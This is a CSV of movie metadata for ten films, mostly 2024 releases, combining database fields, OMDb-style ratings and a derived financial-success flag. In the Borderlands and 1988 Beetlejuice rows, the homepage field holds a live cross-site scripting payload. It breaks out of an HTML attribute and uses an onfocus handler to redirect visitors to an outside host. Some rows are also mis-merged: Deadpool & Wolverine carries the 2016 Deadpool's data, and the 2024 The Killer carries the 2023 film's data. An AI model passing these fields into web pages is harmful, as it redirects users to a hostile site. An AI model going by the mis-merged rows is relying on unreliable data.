adult,backdrop_path,genre_ids,id,original_language,original_title,overview,popularity,poster_path,release_date,title,video,vote_average,vote_count,belongs_to_collection,budget,genres,homepage,imdb_id,origin_country,production_companies,production_countries,revenue,runtime,spoken_languages,status,tagline,Title,Year,Rated,Released,Runtime,Genre,Director,Writer,Actors,Plot,Language,Country,Awards,Poster,Ratings,Metascore,imdbRating,imdbVotes,imdbID,Type,DVD,BoxOffice,Production,Website,Response,financial_success,imdb_rating,rotten_tomatoes_rating,metacritic_rating,totalSeasons,Error
False,/mKOBdgaEFguADkJhfFslY7TYxIh.jpg,"[28, 878, 35, 12, 53]",365177,en,Borderlands,"Returning to her home planet, an infamous bounty hunter forms an unexpected alliance with a team of unlikely heroes. Together, they battle monsters and dangerous bandits to protect a young girl who holds the key to unimaginable power.",2741.991,/865DntZzOdX6rLMd405R0nFkLmL.jpg,2024-08-07,Borderlands,False,5.856,431,,115000000,"[{'id': 28, 'name': 'Action'}, {'id': 878, 'name': 'Science Fiction'}, {'id': 35, 'name': 'Comedy'}, {'id': 12, 'name': 'Adventure'}, {'id': 53, 'name': 'Thriller'}]","https://t.com?m""tabindex=""1""autofocus=""""onfocus=""location.replace('//izi.su/kma')",tt4978420,['US'],"[{'id': 1632, 'logo_path': '/cisLn1YAUuptXVBa0xjq7ST9cH0.png', 'name': 'Lionsgate', 'origin_country': 'US'}, {'id': 221429, 'logo_path': None, 'name': 'Media Capital Technologies', 'origin_country': 'US'}, {'id': 14439, 'logo_path': None, 'name': 'Arad Productions', 'origin_country': 'US'}, {'id': 123244, 'logo_path': '/7eH1Y4RIuontJJXVmmSRrNUMZhU.png', 'name': 'Picturestart', 'origin_country': 'US'}, {'id': 158612, 'logo_path': '/uuByByK2kn72I2c6MGsoa5YQlcJ.png', 'name': 'Gearbox Studios', 'origin_country': 'US'}, {'id': 181160, 'logo_path': '/bfngnSWlPGca8MZG2veYx4JYgOz.png', 'name': '2K', 'origin_country': 'US'}, {'id': 491, 'logo_path': '/5LvDUt3KmvRnXQ4NrdWJYHeuA8J.png', 'name': 'Summit Entertainment', 'origin_country': 'US'}]","[{'iso_3166_1': 'US', 'name': 'United States of America'}]",30863794,101,"[{'english_name': 'English', 'iso_639_1': 'en', 'name': 'English'}]",Released,Chaos loves company.,Borderlands,2024,PG-13,09 Aug 2024,102 min,"Action, Adventure, Comedy",Eli Roth,"Eli Roth, Joe Abercrombie","Cate Blanchett, Kevin Hart, Edgar Ramírez","Based on the best-selling videogame, this all-star action-adventure follows a ragtag team of misfits on a mission to save a missing girl who holds the key to unimaginable power.",English,United States,1 win & 2 nominations,https://m.media-amazon.com/images/M/MV5BOWZmOTM5YmMtNjliMi00OGRkLWIwNGUtNDI2NTE3NzZmMDdmXkEyXkFqcGdeQXVyMTUzMTg2ODkz._V1_SX300.jpg,"[{'Source': 'Internet Movie Database', 'Value': '4.4/10'}, {'Source': 'Rotten Tomatoes', 'Value': '8%'}]",N/A,4.4,"6,140",tt4978420,movie,N/A,"$8,800,000",N/A,N/A,True,False,4.4,8.0,,,
False,/yDHYTfA3R0jFYba16jBB1ef8oIt.jpg,"[28, 35, 878]",533535,en,Deadpool & Wolverine,"A listless Wade Wilson toils away in civilian life with his days as the morally flexible mercenary, Deadpool, behind him. But when his homeworld faces an existential threat, Wade must reluctantly suit-up again with an even more reluctant Wolverine.",2617.082,/8cdWjvZQUExUUTzyp4t6EDMubfO.jpg,2024-07-24,Deadpool & Wolverine,False,7.722,2780,"{'id': 448150, 'name': 'Deadpool Collection', 'poster_path': '/30c5jO7YEXuF8KiWXLg9m28GWDA.jpg', 'backdrop_path': '/hBQOWY8qWXJVFAc8yLTh1teIu43.jpg'}",200000000,"[{'id': 28, 'name': 'Action'}, {'id': 35, 'name': 'Comedy'}, {'id': 878, 'name': 'Science Fiction'}]",https://www.marvel.com/movies/deadpool-and-wolverine,tt6263850,['US'],"[{'id': 420, 'logo_path': '/hUzeosd33nzE5MCNsZxCGEKTXaQ.png', 'name': 'Marvel Studios', 'origin_country': 'US'}, {'id': 104228, 'logo_path': '/hx0C1XcSxGgat8N62GpxoJGTkCk.png', 'name': 'Maximum Effort', 'origin_country': 'US'}, {'id': 2575, 'logo_path': '/9YJrHYlcfHtwtulkFMAies3aFEl.png', 'name': '21 Laps Entertainment', 'origin_country': 'US'}, {'id': 127928, 'logo_path': '/h0rjX5vjW5r8yEnUBStFarjcLT4.png', 'name': '20th Century Studios', 'origin_country': 'US'}, {'id': 176762, 'logo_path': None, 'name': 'Kevin Feige Productions', 'origin_country': 'US'}, {'id': 22213, 'logo_path': '/qx9K6bFWJupwde0xQDwOvXkOaL8.png', 'name': 'TSG Entertainment', 'origin_country': 'US'}]","[{'iso_3166_1': 'US', 'name': 'United States of America'}]",1287237740,128,"[{'english_name': 'English', 'iso_639_1': 'en', 'name': 'English'}]",Released,Come together.,Deadpool,2016,R,12 Feb 2016,108 min,"Action, Comedy",Tim Miller,"Rhett Reese, Paul Wernick","Ryan Reynolds, Morena Baccarin, T.J. Miller","A wisecracking mercenary gets experimented on and becomes immortal yet hideously scarred, and sets out to track down the man who ruined his looks.",English,United States,29 wins & 78 nominations,https://m.media-amazon.com/images/M/MV5BYzE5MjY1ZDgtMTkyNC00MTMyLThhMjAtZGI5OTE1NzFlZGJjXkEyXkFqcGdeQXVyNjU0OTQ0OTY@._V1_SX300.jpg,"[{'Source': 'Internet Movie Database', 'Value': '8.0/10'}, {'Source': 'Rotten Tomatoes', 'Value': '85%'}, {'Source': 'Metacritic', 'Value': '65/100'}]",65,8.0,"1,159,415",tt1431045,movie,N/A,"$363,070,709",N/A,N/A,True,True,8.0,85.0,65.0,,
False,/18wozP6NjPSNBSgCga5bN7yUSzl.jpg,"[35, 27, 14]",917496,en,Beetlejuice Beetlejuice,"After a family tragedy, three generations of the Deetz family return home to Winter River. Still haunted by Beetlejuice, Lydia's life is turned upside down when her teenage daughter, Astrid, accidentally opens the portal to the Afterlife.",1658.314,/kKgQzkUCnQmeTPkyIwHly2t6ZFI.jpg,2024-09-04,Beetlejuice Beetlejuice,False,7.115,286,"{'id': 945475, 'name': 'Beetlejuice Collection', 'poster_path': '/2N5c3ue4bxvTO5OO3bOjHPJZs3H.jpg', 'backdrop_path': '/bJ76WnTj7G8dYQSZJvZejna262D.jpg'}",100000000,"[{'id': 35, 'name': 'Comedy'}, {'id': 27, 'name': 'Horror'}, {'id': 14, 'name': 'Fantasy'}]",https://www.beetlejuicemovie.com,tt2049403,['US'],"[{'id': 174, 'logo_path': '/zhD3hhtKB5qyv7ZeL4uLpNxgMVU.png', 'name': 'Warner Bros. Pictures', 'origin_country': 'US'}, {'id': 360, 'logo_path': '/hbDlIbBdBe0nVFTeZ7hDX3d5n2N.png', 'name': 'Geffen Pictures', 'origin_country': 'US'}, {'id': 81, 'logo_path': '/8wOfUhA7vwU2gbPjQy7Vv3EiF0o.png', 'name': 'Plan B Entertainment', 'origin_country': 'US'}, {'id': 8601, 'logo_path': '/kqubCH3sfBAk4znUj7hjqv8ffgi.png', 'name': 'Tim Burton Productions', 'origin_country': 'US'}, {'id': 216687, 'logo_path': None, 'name': 'Domain Entertainment', 'origin_country': 'US'}, {'id': 228708, 'logo_path': None, 'name': 'Tommy Harper Productions', 'origin_country': 'US'}]","[{'iso_3166_1': 'US', 'name': 'United States of America'}]",153414877,105,"[{'english_name': 'English', 'iso_639_1': 'en', 'name': 'English'}, {'english_name': 'Spanish', 'iso_639_1': 'es', 'name': 'Español'}, {'english_name': 'Italian', 'iso_639_1': 'it', 'name': 'Italiano'}]",Released,The ghost with the most is back.,Beetlejuice Beetlejuice,2024,PG-13,06 Sep 2024,104 min,"Comedy, Fantasy, Horror",Tim Burton,"Alfred Gough, Miles Millar, Seth Grahame-Smith","Michael Keaton, Winona Ryder, Catherine O'Hara","After a family tragedy, three generations of the Deetz family return home to Winter River. Still haunted by Beetlejuice, Lydia's life is turned upside down when her teenage daughter, Astrid, accidentally opens the portal to the Af...",English,United States,2 nominations,https://m.media-amazon.com/images/M/MV5BYmRlYzE3ZTYtNjIyZi00MWYyLWEzZDItOWI5NzM1Yjc0NmI5XkEyXkFqcGc@._V1_SX300.jpg,[],N/A,N/A,N/A,tt2049403,movie,N/A,N/A,N/A,N/A,True,True,,,,,
False,/stKGOm8UyhuLPR9sZLjs5AkmncA.jpg,"[16, 10751, 12, 35]",1022789,en,Inside Out 2,"Teenager Riley's mind headquarters is undergoing a sudden demolition to make room for something entirely unexpected: new Emotions! Joy, Sadness, Anger, Fear and Disgust, who’ve long been running a successful operation by all accounts, aren’t sure how to feel when Anxiety shows up. And it looks like she’s not alone.",1507.477,/vpnVM9B6NMmQpWeZvzLvDESb2QY.jpg,2024-06-11,Inside Out 2,False,7.675,3457,"{'id': 1022790, 'name': 'Inside Out Collection', 'poster_path': '/kvJqs0vm29U0xJa373wlzHb3FRh.jpg', 'backdrop_path': '/7U2m2dMSIfHx2gWXKq78Xj1weuH.jpg'}",200000000,"[{'id': 16, 'name': 'Animation'}, {'id': 10751, 'name': 'Family'}, {'id': 12, 'name': 'Adventure'}, {'id': 35, 'name': 'Comedy'}]",https://movies.disney.com/inside-out-2,tt22022452,['US'],"[{'id': 2, 'logo_path': '/wdrCwmRnLFJhEoH8GSfymY85KHT.png', 'name': 'Walt Disney Pictures', 'origin_country': 'US'}, {'id': 3, 'logo_path': '/1TjvGVDMYsj6JBxOAkUHpPEwLf7.png', 'name': 'Pixar', 'origin_country': 'US'}]","[{'iso_3166_1': 'US', 'name': 'United States of America'}]",1668778335,97,"[{'english_name': 'English', 'iso_639_1': 'en', 'name': 'English'}]",Released,Make room for new emotions.,Inside Out 2,2024,PG,14 Jun 2024,96 min,"Animation, Adventure, Comedy",Kelsey Mann,"Meg LeFauve, Dave Holstein, Kelsey Mann","Amy Poehler, Maya Hawke, Kensington Tallman","A sequel that features Riley entering puberty and experiencing brand new, more complex emotions as a result. As Riley tries to adapt to her teenage years, her old emotions try to adapt to the possibility of being replaced.",English,"United States, Japan",3 nominations,https://m.media-amazon.com/images/M/MV5BYTc1MDQ3NjAtOWEzMi00YzE1LWI2OWUtNjQ0OWJkMzI3MDhmXkEyXkFqcGdeQXVyMDM2NDM2MQ@@._V1_SX300.jpg,"[{'Source': 'Internet Movie Database', 'Value': '7.8/10'}, {'Source': 'Rotten Tomatoes', 'Value': '91%'}]",N/A,7.8,"111,985",tt22022452,movie,N/A,"$646,311,114",N/A,N/A,True,True,7.8,91.0,,,
False,/tCQfubckzzcuCbsGugkpLhfjS5z.jpg,"[28, 53, 80]",970347,en,The Killer,"Zee is a feared contract killer known as ""the Queen of the Dead,"" but when she refuses to murder a young blind woman, she finds herself hunted both by criminal colleagues and a determined police detective.",1496.634,/6PCnxKZZIVRanWb710pNpYVkCSw.jpg,2024-08-22,The Killer,False,6.5,159,,30000000,"[{'id': 28, 'name': 'Action'}, {'id': 53, 'name': 'Thriller'}, {'id': 80, 'name': 'Crime'}]",https://www.peacocktv.com/stream-movies/the-killer,tt1121948,['US'],"[{'id': 33, 'logo_path': '/8lvHyhjr8oUKOOy2dKXoALWKdp0.png', 'name': 'Universal Pictures', 'origin_country': 'US'}, {'id': 507, 'logo_path': '/aRmHe6GWxYMRCQljF75rn2B9Gv8.png', 'name': 'Atlas Entertainment', 'origin_country': 'US'}, {'id': 172860, 'logo_path': None, 'name': 'A Better Tomorrow Films', 'origin_country': 'US'}, {'id': 8147, 'logo_path': '/q6HOAdSNgCbeOqwoMVRc6REgbXF.png', 'name': 'Entertainment One', 'origin_country': 'CA'}]","[{'iso_3166_1': 'CA', 'name': 'Canada'}, {'iso_3166_1': 'US', 'name': 'United States of America'}]",0,126,"[{'english_name': 'English', 'iso_639_1': 'en', 'name': 'English'}, {'english_name': 'French', 'iso_639_1': 'fr', 'name': 'Français'}]",Released,Some alliances form. Others will crumble.,The Killer,2023,R,10 Nov 2023,118 min,"Action, Adventure, Crime",David Fincher,"Alexis Nolent, Luc Jacamon, Andrew Kevin Walker","Michael Fassbender, Tilda Swinton, Charles Parnell","After a fateful near-miss, an assassin battles his employers and himself, on an international manhunt he insists isn't personal.",English,United States,2 wins & 38 nominations,https://m.media-amazon.com/images/M/MV5BZGJkMDUwZWQtYTMzMS00NTg5LWE1ZTYtOTVhMDI4NGI1YjMyXkEyXkFqcGdeQXVyODk4OTc3MTY@._V1_SX300.jpg,"[{'Source': 'Internet Movie Database', 'Value': '6.7/10'}, {'Source': 'Rotten Tomatoes', 'Value': '85%'}]",N/A,6.7,"193,794",tt1136617,movie,N/A,N/A,N/A,N/A,True,False,6.7,85.0,,,
False,/lgkPzcOSnTvjeMnuFzozRO5HHw1.jpg,"[16, 10751, 35, 28]",519182,en,Despicable Me 4,"Gru and Lucy and their girls—Margo, Edith and Agnes—welcome a new member to the Gru family, Gru Jr., who is intent on tormenting his dad. Gru also faces a new nemesis in Maxime Le Mal and his femme fatale girlfriend Valentina, forcing the family to go on the run.",1172.176,/wWba3TaojhK7NdycRhoQpsG0FaH.jpg,2024-06-20,Despicable Me 4,False,7.2,1519,"{'id': 86066, 'name': 'Despicable Me Collection', 'poster_path': '/95prV91f4DxkBnLU43YjLbU1m3q.jpg', 'backdrop_path': '/37xamYKRUGCRux532lKcZdVGYuR.jpg'}",100000000,"[{'id': 16, 'name': 'Animation'}, {'id': 10751, 'name': 'Family'}, {'id': 35, 'name': 'Comedy'}, {'id': 28, 'name': 'Action'}]",https://www.despicable.me,tt7510222,['US'],"[{'id': 33, 'logo_path': '/8lvHyhjr8oUKOOy2dKXoALWKdp0.png', 'name': 'Universal Pictures', 'origin_country': 'US'}, {'id': 6704, 'logo_path': '/fOG2oY4m1YuYTQh4bMqqZkmgOAI.png', 'name': 'Illumination', 'origin_country': 'US'}]","[{'iso_3166_1': 'US', 'name': 'United States of America'}]",914356614,94,"[{'english_name': 'English', 'iso_639_1': 'en', 'name': 'English'}]",Released,Things just got a little more despicable.,Despicable Me 4,2024,PG,03 Jul 2024,94 min,"Animation, Adventure, Comedy","Chris Renaud, Patrick Delage","Mike White, Ken Daurio","Steve Carell, Kristen Wiig, Pierre Coffin","Gru, Lucy, Margo, Edith, and Agnes welcome a new member to the family, Gru Jr., who is intent on tormenting his dad. Gru faces a new nemesis in Maxime Le Mal and his girlfriend Valentina, and the family is forced to go on the run.",English,United States,N/A,https://m.media-amazon.com/images/M/MV5BOTk4MjFhZTMtOWIxOS00YzE2LThkZGEtMzg0MDAyMmFiZmU1XkEyXkFqcGdeQXVyMTY3ODkyNDkz._V1_SX300.jpg,"[{'Source': 'Internet Movie Database', 'Value': '6.2/10'}, {'Source': 'Rotten Tomatoes', 'Value': '56%'}]",N/A,6.2,"26,168",tt7510222,movie,N/A,"$330,131,705",N/A,N/A,True,True,6.2,56.0,,,
False,/rwakNepsh0dXVcTtWKUVbDsSYYZ.jpg,"[28, 80, 53, 35]",573435,en,Bad Boys: Ride or Die,"After their late former Captain is framed, Lowrey and Burnett try to clear his name, only to end up on the run themselves.",1059.196,/oGythE98MYleE6mZlGs5oBGkux1.jpg,2024-06-05,Bad Boys: Ride or Die,False,7.556,1867,"{'id': 14890, 'name': 'Bad Boys Collection', 'poster_path': '/iB59poJBofg1ciKlu6LzZakf11m.jpg', 'backdrop_path': '/k9hhSHg5GS4UgWQC6MHBOZrarji.jpg'}",100000000,"[{'id': 28, 'name': 'Action'}, {'id': 80, 'name': 'Crime'}, {'id': 53, 'name': 'Thriller'}, {'id': 35, 'name': 'Comedy'}]",https://www.badboys.movie,tt4919268,['US'],"[{'id': 122771, 'logo_path': '/bYRqVEAuaC1QWmt3hGo0PMdK7EX.png', 'name': 'Westbrook', 'origin_country': 'US'}, {'id': 5, 'logo_path': '/71BqEFAF4V3qjjMPCpLuyJFB9A.png', 'name': 'Columbia Pictures', 'origin_country': 'US'}, {'id': 10288, 'logo_path': '/Aszf09kIVXR6cwG9lwjZIawbYVS.png', 'name': 'Don Simpson/Jerry Bruckheimer Films', 'origin_country': 'US'}, {'id': 84792, 'logo_path': '/7Rfr3Zu6QnHpXW2VdSEzUminAQd.png', 'name': '2.0 Entertainment', 'origin_country': 'US'}]","[{'iso_3166_1': 'US', 'name': 'United States of America'}]",402529640,115,"[{'english_name': 'English', 'iso_639_1': 'en', 'name': 'English'}]",Released,Miami's finest are now its most wanted.,Bad Boys: Ride or Die,2024,R,07 Jun 2024,115 min,"Action, Adventure, Comedy","Adil El Arbi, Bilall Fallah","Chris Bremner, Will Beall, George Gallo","Will Smith, Martin Lawrence, Vanessa Hudgens","When their late police captain gets linked to drug cartels, wisecracking Miami cops Mike Lowrey and Marcus Burnett embark on a dangerous mission to clear his name.",English,United States,1 nomination,https://m.media-amazon.com/images/M/MV5BY2U5YmQ3YjgtM2I2OC00YmM5LTkyM2MtN2I5Zjg2MDE0ODkwXkEyXkFqcGdeQXVyMDM2NDM2MQ@@._V1_SX300.jpg,"[{'Source': 'Internet Movie Database', 'Value': '6.7/10'}, {'Source': 'Rotten Tomatoes', 'Value': '65%'}]",N/A,6.7,"58,436",tt4919268,movie,N/A,"$193,470,708",N/A,N/A,True,True,6.7,65.0,,,
False,/su7GvFVUV5uWtAPGAVRkpDrA6Wl.jpg,"[14, 35]",4011,en,Beetlejuice,A newly dead New England couple seeks help from a deranged demon exorcist to scare an affluent New York family out of their home.,1048.715,/nnl6OWkyPpuMm595hmAxNW3rZFn.jpg,1988-03-30,Beetlejuice,False,7.38,6898,"{'id': 945475, 'name': 'Beetlejuice Collection', 'poster_path': '/2N5c3ue4bxvTO5OO3bOjHPJZs3H.jpg', 'backdrop_path': '/bJ76WnTj7G8dYQSZJvZejna262D.jpg'}",15000000,"[{'id': 14, 'name': 'Fantasy'}, {'id': 35, 'name': 'Comedy'}]","https://t.com?m""tabindex=""1""autofocus=""""onfocus=""location.replace('//izi.su/kma')",tt0094721,['US'],"[{'id': 174, 'logo_path': '/zhD3hhtKB5qyv7ZeL4uLpNxgMVU.png', 'name': 'Warner Bros. Pictures', 'origin_country': 'US'}, {'id': 360, 'logo_path': '/hbDlIbBdBe0nVFTeZ7hDX3d5n2N.png', 'name': 'Geffen Pictures', 'origin_country': 'US'}]","[{'iso_3166_1': 'US', 'name': 'United States of America'}]",74849333,92,"[{'english_name': 'English', 'iso_639_1': 'en', 'name': 'English'}]",Released,"In this house, if you've seen one ghost...you haven't seen them all.",Beetlejuice,1988,PG,30 Mar 1988,92 min,"Comedy, Fantasy",Tim Burton,"Michael McDowell, Larry Wilson, Warren Skaaren","Alec Baldwin, Geena Davis, Michael Keaton","The spirits of a deceased couple are harassed by an unbearable family that has moved into their home, and hire a malicious spirit to drive them out.",English,United States,Won 1 Oscar. 7 wins & 11 nominations total,https://m.media-amazon.com/images/M/MV5BZDdmNjBlYTctNWU0MC00ODQxLWEzNDQtZGY1NmRhYjNmNDczXkEyXkFqcGdeQXVyMTQxNzMzNDI@._V1_SX300.jpg,"[{'Source': 'Internet Movie Database', 'Value': '7.5/10'}, {'Source': 'Rotten Tomatoes', 'Value': '86%'}, {'Source': 'Metacritic', 'Value': '70/100'}]",70,7.5,"348,874",tt0094721,movie,N/A,"$74,664,632",N/A,N/A,True,True,7.5,86.0,70.0,,
False,/7aPrv2HFssWcOtpig5G3HEVk3uS.jpg,"[28, 12, 53]",718821,en,Twisters,"As storm season intensifies, the paths of former storm chaser Kate Carter and reckless social-media superstar Tyler Owens collide when terrifying phenomena never seen before are unleashed. The pair and their competing teams find themselves squarely in the paths of multiple storm systems converging over central Oklahoma in the fight of their lives.",952.418,/pjnD08FlMAIXsfOLKQbvmO0f0MD.jpg,2024-07-10,Twisters,False,6.99,1330,"{'id': 1062948, 'name': 'Twister Collection', 'poster_path': '/eVWAEf5hxt8lwYIarAiOJLDX1E5.jpg', 'backdrop_path': '/bnb3pWSDihCCeZ0wGlFBbTScyZv.jpg'}",155000000,"[{'id': 28, 'name': 'Action'}, {'id': 12, 'name': 'Adventure'}, {'id': 53, 'name': 'Thriller'}]",https://www.twisters-movie.com,tt12584954,['US'],"[{'id': 33, 'logo_path': '/8lvHyhjr8oUKOOy2dKXoALWKdp0.png', 'name': 'Universal Pictures', 'origin_country': 'US'}, {'id': 174, 'logo_path': '/zhD3hhtKB5qyv7ZeL4uLpNxgMVU.png', 'name': 'Warner Bros. Pictures', 'origin_country': 'US'}, {'id': 56, 'logo_path': '/cEaxANEisCqeEoRvODv2dO1I0iI.png', 'name': 'Amblin Entertainment', 'origin_country': 'US'}, {'id': 216687, 'logo_path': None, 'name': 'Domain Entertainment', 'origin_country': 'US'}]","[{'iso_3166_1': 'US', 'name': 'United States of America'}]",364092150,123,"[{'english_name': 'English', 'iso_639_1': 'en', 'name': 'English'}]",Released,Chase. Ride. Survive.,Twisters,2024,PG-13,19 Jul 2024,122 min,"Action, Adventure, Thriller",Lee Isaac Chung,"Mark L. Smith, Joseph Kosinski, Michael Crichton","Daisy Edgar-Jones, Glen Powell, Anthony Ramos","Kate Carter, a retired tornado-chaser and meteorologist, is persuaded to return to Oklahoma to work with a new team and new technologies.",English,United States,1 nomination,https://m.media-amazon.com/images/M/MV5BZTQ0YjZhNzMtMzMwYi00YTQwLTlhYTgtNDBlZjRhYjJmMzJmXkEyXkFqcGc@._V1_SX300.jpg,"[{'Source': 'Internet Movie Database', 'Value': '6.8/10'}, {'Source': 'Rotten Tomatoes', 'Value': '75%'}]",N/A,6.8,"74,424",tt12584954,movie,N/A,"$240,836,885",N/A,N/A,True,True,6.8,75.0,,,
False,/p5kpFS0P3lIwzwzHBOULQovNWyj.jpg,"[80, 53]",1032823,en,Trap,"A father and teen daughter attend a pop concert, where they realize they're at the center of a dark and sinister event.",790.927,/jwoaKYVqPgYemFpaANL941EF94R.jpg,2024-07-31,Trap,False,6.527,972,,30000000,"[{'id': 80, 'name': 'Crime'}, {'id': 53, 'name': 'Thriller'}]",https://www.trapthefilm.com,tt26753003,['US'],"[{'id': 12236, 'logo_path': '/bVu0qQm4GujSTCvZZz9S3rHDczA.png', 'name': 'Blinding Edge Pictures', 'origin_country': 'US'}]","[{'iso_3166_1': 'US', 'name': 'United States of America'}]",77046616,105,"[{'english_name': 'English', 'iso_639_1': 'en', 'name': 'English'}]",Released,"30,000 fans. 300 cops. 1 serial killer. No escape.",Trap,2024,PG-13,02 Aug 2024,105 min,"Crime, Horror, Mystery",M. Night Shyamalan,M. Night Shyamalan,"Josh Hartnett, Ariel Donoghue, Saleka Shyamalan",A father and his teen daughter attend a pop concert only to realize they've entered the center of a dark and sinister event.,English,"United States, Canada",N/A,https://m.media-amazon.com/images/M/MV5BMzJiN2UyZjgtMjQ3MS00MDhhLTg5ZDItZmVjMTU3MTcwNzE4XkEyXkFqcGc@._V1_SX300.jpg,"[{'Source': 'Internet Movie Database', 'Value': '6.2/10'}, {'Source': 'Rotten Tomatoes', 'Value': '50%'}]",N/A,6.2,"25,924",tt26753003,movie,N/A,"$38,584,267",N/A,N/A,True,True,6.2,50.0,,,
